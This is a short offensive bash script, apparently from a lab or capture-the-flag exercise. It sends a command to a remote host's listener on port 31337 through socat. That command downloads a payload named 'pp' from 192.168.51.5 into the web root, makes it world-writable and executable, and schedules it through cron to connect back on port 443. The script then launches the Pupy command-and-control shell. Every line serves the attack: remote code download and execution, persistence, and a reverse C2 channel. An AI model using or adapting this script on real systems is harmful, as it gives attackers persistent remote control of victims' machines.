#!/bin/bash

MIN=$(date --date="now + 1 minutes" +"%M")
HOU=$(date --date="now + 1 minutes" +"%H")

echo -e "curl http://192.168.51.5/pp -o /var/www/html/pp; chmod 777 /var/www/html/pp; echo \"${MIN} ${HOU} * * *  /var/www/html/pp simple --host 192.168.51.5:443\" > /tmp/mycron; crontab /tmp/mycron" | socat - TCP:192.168.51.100:31337
python /root/pupy/pupy/pupysh.py

